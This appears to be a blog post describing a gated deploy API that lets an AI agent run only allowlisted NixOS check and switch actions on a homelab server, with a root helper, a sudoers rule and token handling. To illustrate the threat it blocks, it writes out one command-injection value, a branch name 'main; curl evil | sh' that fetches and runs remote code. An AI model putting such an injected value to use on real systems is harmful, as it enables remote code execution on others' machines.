My homelab runs on NixOS, and I keep its configuration in a flake on my own Forgejo instance. For a long time the rule in that repository's `AGENTS.md` was simple and absolute:

> **AI commits, human deploys.** The AI never runs `nixos-rebuild switch` on a host. Push to Forgejo; the human activates.

That rule existed for a good reason. The agent I work with is good at writing Nix, and my server runs about twenty-five containers, a reverse proxy, a metrics stack and a lot of DNS. Letting a language model rebuild the machine that hosts all of it, unsupervised, is a bet I was not ready to make.

But the rule had a cost. Every change I made to the server was a change I had to make by hand, and hand-making it meant remembering the exact commands, watching a twenty-minute build, and losing the thread of what I was actually doing while the build ran. The agent could write the change and push it; it could not finish the job.

So I built the missing piece: **a gated deploy API**. It is a small service that lives on the homelab server, exposes a handful of HTTP endpoints over my tailnet, and does exactly one thing: run a *pre-approved* NixOS action against a branch that the agent has already pushed.

The interesting part is not that the agent can deploy. It is that the agent can deploy **without being able to choose what gets deployed**.

## The shape of it

![Architecture of the gated-deploy API: the agent on one machine, the API service, root helper and systemd unit on the homelab server, with a Nix-generated allowlist in between](/images/blog/2026/gated-deploy-architecture.svg)

There are three moving pieces, and they are deliberately not merged.

**The lookup surface** is an MCP server for NixOS. It answers questions about real option names, package versions and channels by querying nixos.org and NixHub. It is read-only, it runs on the agent's own machine as a local subprocess, and it cannot execute anything anywhere.

**The deploy surface** is the API service. It runs on the homelab server, listens on a loopback port that is published to the tailnet by Tailscale Serve, and it is the only thing that can cause a rebuild. It cannot look anything up.

**The allowlist** is a file generated by Nix at build time. It is the policy: the exact set of commands that may run, and on which host. The service reads it; the root helper reads it; the agent cannot.

Keeping the lookup and the deploy apart is not fussiness. One of them parses remote HTTP and the other one runs code as root. I would rather they were separate processes with a different trust profile than one binary with both jobs.

## The allowlist is Nix, not a config file

The first design decision that made the rest work was this: **the allowlist is an argv array evaluated in Nix**, not a list of command strings in a JSON file.

In the server's configuration it looks like this:

```nix
services.gatedDeploy = {
  enable = true;

  gitUrl = "https://forgejo.example.net/homelab/nixos-systems-configuration.git";

  allowedCommands.homelab-server.check = {
    argv = [
      "${pkgs.coreutils}/bin/env"
      "PATH=${pkgs.coreutils}/bin:${pkgs.git}/bin:${pkgs.nix}/bin:/run/current-system/sw/bin"
      "${pkgs.nix}/bin/nix"
      "eval" "--impure" "--no-write-lock-file"
      ".#nixosConfigurations.homelab-server.config.system.build.toplevel.drvPath"
    ];
  };

  allowedCommands.homelab-server.switch = {
    argv = [
      "${pkgs.coreutils}/bin/env"
      "PATH=${pkgs.coreutils}/bin:${pkgs.git}/bin:${pkgs.nix}/bin:${pkgs.systemd}/bin:${pkgs.sudo}/bin:${pkgs.nixos-rebuild}/bin:/run/current-system/sw/bin"
      "${pkgs.nixos-rebuild}/bin/nixos-rebuild"
      "switch" "--flake" ".#homelab-server" "--impure" "--no-write-lock-file"
    ];
    timeoutSeconds = 7200;
  };
};
```

Three things follow from writing it this way.

**There is no shell anywhere.** The service hands an argv straight to `execve`. There is no string to interpolate a branch name into, so the classic "the branch name was `main; curl evil | sh`" attack does not exist as a category. A branch name is data, not syntax.

**The set of things the agent can do is visible in a `git diff`.** Adding a capability is a change to a Nix file, reviewed like any other change to the server's configuration. The gate is not a runtime permission dialog that someone can click past; it is code.

**The paths are pinned by the flake.** `${pkgs.nix}/bin/nix` is a store path, not a name resolved through a mutable `PATH`. Combined with the explicit `PATH` in the argv, that is what makes the job reproducible - and, as I found the hard way, necessary: the job runs in a systemd unit, not in a shell, so it inherits systemd's default `PATH`, and `nixos-rebuild` calls `test`, `rm` and `systemd-run` *by name*. Without a `PATH` of its own, a rebuild completes successfully and then dies at the activation step with `No such file or directory: 'test'`. Your own shell hides this, because `test` is a shell builtin.

## What the request actually contains

The API takes a host, an action and a branch. That is the entire request body:

```json
{ "host": "homelab-server", "action": "switch", "branch": "feature/new-proxy" }
```

The agent picks the branch - it just pushed it, after all. It picks the action from the list the server publishes, and it cannot pick anything else. If it asks for an action that is not in the allowlist, the server answers `404` and nothing happens. There is no default action and no fallthrough.

The branch name is validated twice: once with git's own `check-ref-format`, and once against a stricter allowlist of characters that cannot mean anything to a shell. That second layer is not paranoia about a shell I do not use - it is about not having to reason about the difference between "we validated it" and "we validated it and it happens to be harmless".

## The privilege model: one helper, one sudoers line

The service runs as an unprivileged dedicated user. It is reachable over the network, so it must not be root, but `nixos-rebuild switch` refuses to run as anything else. Something has to bridge that gap, and the bridging is where all the risk lives.

There is exactly one privileged program on the server: a root-owned helper at `/usr/local/libexec/gated-deploy-job`. The service may run it, through a single sudoers rule:

```text
gated-deploy ALL=(root) NOPASSWD: \
  /usr/local/libexec/gated-deploy-job ^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$
```

The path is literal and the argument is a regular expression, which is not a detail: sudo matches the path and the arguments separately, and without the trailing `$` a path rule matches by prefix - so a rule for `gated-deploy-job` would also match `gated-deploy-job-evil`, and sudo would then run the path the *caller* typed.

The helper takes one argument: a job id. Everything else it works out for itself.

1. It reads the request from a spool file the service wrote - and rejects that file if it contains anything other than `host`, `action` and `branch`.
2. It looks `(host, action)` up in the root-owned allowlist and builds the argv. The service never can; the service only picks the key.
3. It validates the branch, fetches it from the pinned remote, and checks out `refs/remotes/<remote>/<branch>`.
4. It starts a transient systemd unit with that fixed argv.

So the service can choose *which approved action runs* and *which branch it runs against*, and nothing else. Its entire reach is a Nix diff.

One detail I like: the Forgejo token the helper uses to fetch the branch is passed to git through the **environment**, not the command line:

```text
GIT_CONFIG_COUNT=2
GIT_CONFIG_KEY_0=http.extraHeader
GIT_CONFIG_VALUE_0=Authorization: Basic <base64>
GIT_CONFIG_KEY_1=credential.helper
GIT_CONFIG_VALUE_1=
GIT_TERMINAL_PROMPT=0
```

`/proc/<pid>/cmdline` is world-readable on Linux; `/proc/<pid>/environ` is readable only by the process's own user - and the helper runs as root. So the token stays out of reach of every unprivileged user on the box.

## The agent never touches the server's files

This is the part I care about most, and it is worth being precise about, because "the AI does not have access to the server" is easy to say and easy to get wrong.

The agent has **no SSH access** to the homelab server. It cannot read a file on it, not even a log it is allowed to see. Its entire interaction is:

- push a branch to Forgejo, with its own scoped token;
- make HTTP requests to the API, with a bearer token.

The server fetches the branch itself, with its own read-only token, into its own checkout directory. The working tree is root-owned, so the unprivileged service user cannot read it either - and does not need to. The agent's write access to the server's filesystem is exactly zero, and its ability to *choose* what runs on the server is exactly the set of allowlisted actions.

The API service compares the bearer token in constant time and answers `401` without saying why. The token reaches the service through systemd's `LoadCredential=`, so the file on disk stays root-owned and mode `0600`, and it never appears in a URL, a request body, a log line or an error message.

## The other half: looking things up before writing them

A large part of what makes an agent usable on a NixOS box is not the deploying. It is not writing `services.foo.bar = true` when the option is actually `services.foo.baz`, or inventing a package attribute that has not existed for two years.

That is what the MCP lookup surface is for. It exposes two tools: one that searches NixOS, Home Manager, nix-darwin, flakes, FlakeHub and the NixOS wiki for options and packages, and one that answers version-history questions from NixHub - "which nixpkgs commit shipped this version, and under which attribute path".

```text
nix    {"action": "search", "query": "gated deploy", "type": "options"}
nix    {"action": "info", "query": "nixos-rebuild", "channel": "unstable"}
nix_versions {"package": "nix", "version": "2.24.11"}
```

The one rule that matters: ask for `channel="unstable"`, because that is what my server tracks. The stable channel has a different option set and will happily confirm options that do not exist on my host.

The lookup answers at *channel* granularity, though, and my flake pins a specific nixpkgs revision. So when the answer decides something - the exact name of an option I am about to write into a configuration - I still cross-check it against the real pin with `nix eval`. An option that exists in the wrong module is still an option that does not exist.

## Testing the change before it ever reaches the server

The gate would be pointless if the first test of a change happened on the live machine. The workflow is a ladder, and each rung is cheaper than the one below it.

**Locally, in the config repository:** `nix flake check` builds the flake, which builds the package, which runs the whole test suite - a hundred and eleven tests across the shared schemas, the root helper's flow with every external command stubbed, the HTTP surface end to end, and the client's configuration and job ledger.

**The end-to-end smoke test:** a script that runs the *real* chain - client, HTTP, service, `sudo`, root helper, `git`, a real transient systemd unit - against a local git remote. It needs root because it installs a helper, a sudoers rule and a system user, and it removes everything it created on the way out, including on failure. When it fails, it tells you which link in the chain broke.

**Through the API, on the server, without touching the running system:** the `check` action evaluates the configuration and does not activate it:

```sh
nix eval --impure .#nixosConfigurations.homelab-server.config.system.build.toplevel.drvPath
```

That is a minute, instead of half an hour, and a mistake in the file cannot change the running server.

**And only then, `switch`**, which is the action that rebuilds and activates the host. That is the one that makes the API worth having.

## The workflow, end to end

From the agent's point of view a deploy is four steps:

```sh
# 1. what does the host actually permit?
gated-deploy allowed

# 2. evaluate the branch without activating it
gated-deploy deploy --host homelab-server --action check --branch feature/new-proxy

# 3. rebuild and activate
gated-deploy deploy --host homelab-server --action switch --branch feature/new-proxy --watch

# 4. what happened?
gated-deploy jobs
```

`--watch` polls every three seconds and prints the log as it arrives, with the state whenever it changes - so a rebuild is something you watch rather than something you wait out in the dark. The client prints the **job id**, which is the only handle a later session needs; the three harnesses I use share one job ledger, so a job started by one can be picked up by another.

The exit codes are worth knowing, because they tell the agent what to do next:

| Code | Meaning |
|---|---|
| 0 | the job succeeded |
| 1 | the client could not do its job - the service is unreachable, or the token is wrong |
| 2 | the command line was wrong, or the service refused the request |
| 3 | the job ran and failed - read the log |
| 4 | the job is still running; the budget ran out. The job id is the handle. Ask again later. |

A full rebuild of my server takes twenty minutes or more, so the budget is not a target. When it runs out, the right move is to report the job id and stop, not to loop.

## The honest caveats

A few things I want to be straight about.

**Deploying a branch is remote code execution, by design.** The allowlist limits *which command runs*, not *what that command builds*. The branch's Nix expressions are evaluated and built as root on the server. The owner of this setup - me - has accepted that. If you want a different trade-off, this is the line to argue about.

**There is no rollback action.** No `--rollback`, no force-reboot equivalent in the allowlist. Recovery is booting the previous systemd-boot generation on the console, which is a human operation. A `switch` that exits 0 but leaves the host in a bad state cannot be undone from the agent side, and inventing one is out of scope.

**The first `switch` had to be done by hand.** The deployment that *adds* `switch` to the allowlist cannot go through the API, because the API running on the live server does not have that action yet. That is the one switch the gate can never make for itself, and it is a nice property rather than an accident.

**Any branch is deployable.** There is no per-deploy human approval step. Authentication answers "is this the client?"; the allowlist answers "is this command allowed?"; the decision that no human sits between them is a third, separate choice, and it is mine to make. It is a real risk, and it is the reason I would not deploy this design to a server whose failure I care about more than my homelab's.

## What I would keep

The thing I did not expect to enjoy most is how *unremarkable* the security model became once the allowlist was data instead of behaviour. There is no shell to reason about, no permission dialog, no prompt injection into a command template. The service has a very small job, the helper has a very small job, and the whole thing is auditable by reading a diff of the server's Nix configuration.

The other thing I did not expect: the MCP lookup surface matters as much as the deploy surface. An agent that writes correct Nix the first time needs far less supervision than an agent that guesses at option names and needs someone to catch it. The gate is what makes the *deploy* safe. The lookup is what makes the *code* good.

Both are read from the same place - the real NixOS documentation and the real channel - instead of from the model's memory. That is the part I would not give up.
